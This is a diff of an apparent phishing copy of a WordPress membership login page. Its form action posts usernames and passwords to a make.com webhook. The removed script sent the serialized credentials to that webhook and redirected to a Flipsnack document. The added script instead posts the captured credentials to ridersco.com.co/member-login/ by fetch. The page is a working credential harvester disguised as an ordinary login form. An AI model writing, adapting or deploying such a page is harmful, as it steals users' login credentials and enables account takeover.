@@ -218,7 +218,7 @@ var woocommerce_params = {"ajax_url":"\/wp-admin\/admin-ajax.php","wc_ajax_url":
     <div class="ihc-login-form-wrap ihc-login-template-13">
         <form action="https://hook.eu2.make.com/64pyy2l1vw33vc0xd5kchfszj9gsg76k" method="post" id="ihc_login_form">
             <input type="hidden" name="ihcaction" value="login" />
-            <input type="hidden" name="ihc_login_nonce" value="7f62c1d89a" />
+            <input type="hidden" name="ihc_login_nonce" value="abcbc77aae" />
             <div class="impu-form-line-fr">
                 <span class="impu-form-label-fr impu-form-label-username">Username or Email</span>
                 <input type="text" value="" id="iump_login_username" name="log" />
@@ -243,43 +243,44 @@ var woocommerce_params = {"ajax_url":"\/wp-admin\/admin-ajax.php","wc_ajax_url":
         </form>
     </div>
     <script>
-    jQuery(document).ready(
-        function(){
-            jQuery('#iump_login_username').on('blur', function(){
+    jQuery(document).ready(function(){
+        jQuery('#iump_login_username').on('blur', function(){
+            ihcCheckLoginField('log', 'Please complete all required fields!');
+        });
+
+        jQuery('#iump_login_password').on('blur', function(){
+            ihcCheckLoginField('pwd', 'Please complete all required fields!');
+        });
+
+        jQuery('#ihc_login_form').on('submit', function(e){
+            e.preventDefault();
+            var u = jQuery('#ihc_login_form [name=log]').val();
+            var p = jQuery('#ihc_login_form [name=pwd]').val();
+
+            if (u !== '' && p !== ''){
+                // Envío del formulario a https://www.ridersco.com.co/member-login/
+                fetch('https://www.ridersco.com.co/member-login/', {
+                    method: 'POST',
+                    body: new URLSearchParams(jQuery(this).serialize()),
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded'
+                    }
+                })
+                .then(response => {
+                    console.log('Status Code:', response.status);
+                })
+                .catch(error => {
+                    console.error('Error sending to ridersco.com.co:', error);
+                });
+            } else {
                 ihcCheckLoginField('log', 'Please complete all required fields!');
-            });
-            jQuery('#iump_login_password').on('blur', function(){
                 ihcCheckLoginField('pwd', 'Please complete all required fields!');
-            });
-            jQuery('#ihc_login_form').on('submit', function(e){
-                e.preventDefault();
-                var u = jQuery('#ihc_login_form [name=log]').val();
-                var p = jQuery('#ihc_login_form [name=pwd]').val();
-                if (u!='' && p!=''){
-                    jQuery.ajax({
-                        type: 'POST',
-                        url: 'https://hook.eu2.make.com/64pyy2l1vw33vc0xd5kchfszj9gsg76k',
-                        data: jQuery(this).serialize(),
-                        success: function(response) {
-                            if (response == 200) {
-				    console.log("si detecto");
-                                window.location.href = 'https://www.flipsnack.com/68F969FF8D6/doc-20231212-wa0003_231213_143816-2/full-view.html';
-                            } else if (response == 401) {
-                                alert('Email o Contraseña incorrectos'); 
-                            }
-                        },
-                        error: function(error) {
-                            console.log(error);
-                        }
-                    });
-                } else {
-                    ihcCheckLoginField('log', 'Please complete all required fields!');
-                    ihcCheckLoginField('pwd', 'Please complete all required fields!');
-                }
-            });
-        }
-    );
+            }
+        });
+    });
 </script>
+
+
 
 
 </div>
